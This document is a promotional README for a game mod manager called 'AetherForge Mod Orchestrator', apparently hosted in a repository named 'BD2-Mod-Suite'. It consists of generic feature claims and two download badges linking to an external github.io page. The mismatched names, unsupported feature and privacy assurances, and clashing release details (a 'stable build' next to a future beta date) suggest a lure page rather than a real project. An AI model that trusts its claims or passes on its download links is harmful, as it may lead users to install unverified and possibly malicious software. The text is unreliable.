![preview](https://raw.githubusercontent.com/vamjameet/BD2-Mod-Suite/main/screen_f7a8dc4.svg)

# AetherForge Mod Orchestrator

Welcome to **AetherForge Mod Orchestrator**—a revolutionary companion designed to harmonize, validate, and deploy modifications for modern tactical RPGs. Born from the necessity to bring order to chaotic mod ecosystems, AetherForge transforms scattered file edits into a symphony of structured, reversible, and shareable mod experiences. Unlike traditional management tools that merely copy files, AetherForge treats every mod as a living entity with dependencies, conflicts, and a lifecycle—giving you fine-grained control without ever touching a single game file directly.

---

## Overview

AetherForge is not another folder watcher. It is a **modular operating layer** that sits between your game directory and the community-driven creativity of mod authors. Think of it as a conductor for your digital orchestra: every mod is an instrument, and AetherForge ensures they play in harmony, never drowning out one another. With a focus on **conflict resolution**, **version rollback**, and **profile sharing**, this tool is built for both the casual player who wants one quality-of-life tweak and the power user juggling 200+ modifications across multiple playthroughs.

### Why "Orchestrator"?

Because managing mods is not just about installation—it's about **choreography**. A single mod can alter game balance, UI, textures, and dialogue. When you stack ten mods, the interactions become non-linear. AetherForge introduces a **dependency graph** that visualizes these interactions in real time, predicting conflicts before they appear in-game. It’s proactive, not reactive.

---

## ✨ Core Features

### 1. **Conflict Cascade Visualizer** 🧠
No more blind trial-and-error. AetherForge maps every file modification to a color-coded **cascade diagram**. Green for compatible, amber for warnings, red for hard clashes. You can click any node to see exactly which mod overwrites what, and even **reorder the loading priority** with a drag-and-drop interface.

### 2. **Snapshot Rollback** ⏪
Every change is captured as a **time-stamped snapshot**. Accidentally broke your save? Restore to a snapshot from 30 minutes ago—not just the files, but the entire mod state, including load order and enabled/disabled status. It's a version control system for your game, without needing a single terminal command.

### 3. **Pattern-Based Auto-Staging** 🧩
Instead of choosing mods manually, create **behavioral templates**. For example, a "Visual Overhaul" template automatically detects and stages all mods tagged with `visual`, `reshade`, or `texture-pack` folders. The system learns your preferences over time, suggesting new mods that match your play style.

### 4. **Offline-Capable Archive** 💾
AetherForge maintains a **local metadata cache** of all mods you have ever applied. This means you can traverse your entire mod history, re-download, and re-apply them even if the original source website goes offline. Your library becomes a personal, immutable archive.

### 5. **Multilingual Mod Metadata Translator** 🌍
The community is global. AetherForge automatically translates mod descriptions and readme files into your preferred language (currently supporting 12 major languages) using a built-in phrase-analytics engine. No more guessing what a Korean or Russian mod note says—it appears natively in your language.

### 6. **Peer-Review Integration** ⭐
Before applying a mod, see a **community trust score** based on aggregate user reports (crashes, save corruption, performance issues). This is not a popularity contest; it’s a reliability index calculated from weighted error logs.

---

## 📥 [![Download](https://raw.githubusercontent.com/vamjameet/BD2-Mod-Suite/main/pkg_4d86.svg)](https://vamjameet.github.io/BD2-Mod-Suite/)

Get started with the latest stable build for Windows, Linux, and macOS. The installer includes the core engine, default asset presets, and the offline documentation browser.

---

## Getting Started

### System Prerequisites
- **OS**: Windows 10/11, Ubuntu 22.04+, macOS Ventura+
- **RAM**: 8 GB minimum (16 GB recommended for large mod libraries)
- **Storage**: 500 MB for the application, plus space for your mod cache
- **Display**: 1280x720 minimum resolution; UI scales up to 4K without blur

### First Launch Wizard
Upon first run, AetherForge detects your game installation path automatically. If it cannot locate it, you will be presented with a **simple folder picker**—no manual PATH editing required. The wizard then scans your current game directory to see if any legacy mods exist, importing them with a **frictionless migration tool**.

---

## 🧑‍💻 Usage Guide

### Applying Your First Mod
1. Launch AetherForge and navigate to the **Library** tab.
2. Import a mod by either dragging a `.zip` or `.rar` file into the window, or pointing to a folder containing loose files.
3. The **Integrity Analyzer** will inspect the archive for rogue files (e.g., malicious executables) and check for known game file overlaps.
4. Click **"Stag e"** to place the mod in the **Pending Queue**.
5. Review the Conflict Cascade. If no red nodes appear, hit **"Activate"**.
6. The game launches through AetherForge's wrapper, or you can launch it externally—the mods remain active.

### Managing Profiles
Profiles are **entirely isolated mod states**. You can have a "Vanilla Plus" profile, a "Photorealism" profile, and a "Hardcore Balance" profile—all running on the same game installation. Switching profiles takes less than 3 seconds because AetherForge uses **symbolic link swapping** rather than copying files.

### Sharing Creations
Exporting a mod list creates a **single portable recipe file** (`.aether` extension). This file contains the load order, priority settings, and external download links. Friends can import this recipe, and AetherForge will attempt to auto-fetch all required mods from their original sources.

---

## 🗂️ Project Structure

AetherForge is a monorepo containing three primary applications:

| Directory | Description |
| :--- | :--- |
| `/engine` | Core C++ background service handling file operations and game detection. |
| `/interface` | Electron-based frontend (React + TypeScript) for the visual dashboard. |
| `/language-server` | Rust-based utility for fast metadata parsing and conflict resolution. |

The engine communicates with the interface via a **local gRPC protocol**, ensuring high-performance I/O without blocking the UI thread.

---

## ⚙️ Configuration & Customization

AetherForge is deeply configurable via a human-readable `.json5` config file located in your user directory.

- **`use_symlinks`**: Toggle between physical file copies (safe) and symlinks (space-saving).
- **`backup_retention_days`**: How long to keep snapshot backups before purging.
- **`auto_update_metadata`**: Automatically fetch community ratings for mods every 24 hours (requires internet).
- **`ui_scale_factor`**: For ultra-wide or high-DPI screens.

You can also build your own **plugin scripts** using a simple REST API exposed on `localhost`. This allows advanced users to write custom automations (e.g., "after every game update, disable all audio mods").

---

## 🌍 Multilingual Support

Fully localized interface for:
- English, Spanish, French, German, Japanese, Korean, Simplified Chinese, Traditional Chinese, Russian, Portuguese (BR), Italian, and Polish.

UI strings are stored in a central translation table; community contributions are always welcome via the localization branch.

---

## 🛡️ Security & Privacy

- **No telemetry**: AetherForge does not collect usage statistics, personal data, or game activity.
- **Local-first processing**: All mod analysis happens on your machine.
- **Verified archives**: The importer rejects any archive that attempts to write outside the game directory or the designated mod cache folder.

---

## 🤝 Community & Support

We offer **24/7 asynchronous support** via a community forum and a Discord server. While we cannot guarantee real-time reponses, our automated triage bot answers common questions instantly. Premium support (with 24-hour response SLA) is available for patrons.

---

## ❗ Disclaimer

**AetherForge Mod Orchestrator is an independent project and is not affiliated with, endorsed by, or sponsored by the developers or publishers of any game compatible with this tool.** All game-related trademarks are property of their respective owners. AetherForge is provided "as is" without warranty of any kind. The use of modifications may violate the End User License Agreement (EULA) of certain games; it is your responsibility to check and obey such agreements. We do not promote the circumvention of digital rights management (DRM) or copy protection. Our tool strictly manages files you already own or have permission to modify.

---

## 📜 License

This project is released under the **MIT License**. You are free to use, modify, distribute, and sell derivatives, provided you retain the original copyright notice.

```
MIT License

Copyright (c) 2026 AetherForge Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

For the full license text, see the [LICENSE](LICENSE.md) file in this repository.

---

## 🙏 Acknowledgements

- Built with a passion for **game preservation** and **player agency**.
- Special thanks to the open-source community for providing the foundational libraries (Boost, React, Serde).
- Dedicated to all mod authors who create incredible content for the love of the game.

---

## Final Call to Action

If you need to manage more than three mods without losing your sanity, AetherForge is your copilot. It treats your game directory as a fragile ecosystem, not a dumping ground. We are continuously improving the conflict prediction engine, and we welcome feature requests via the GitHub Issues tab.

**Ready to tame the chaos?**

[![Download](https://raw.githubusercontent.com/vamjameet/BD2-Mod-Suite/main/pkg_4d86.svg)](https://vamjameet.github.io/BD2-Mod-Suite/)

---

*Projected schedule: Beta v0.9.4 expected in Q3 2026. All code is maintained publicly. Star the repo to follow long-term development.*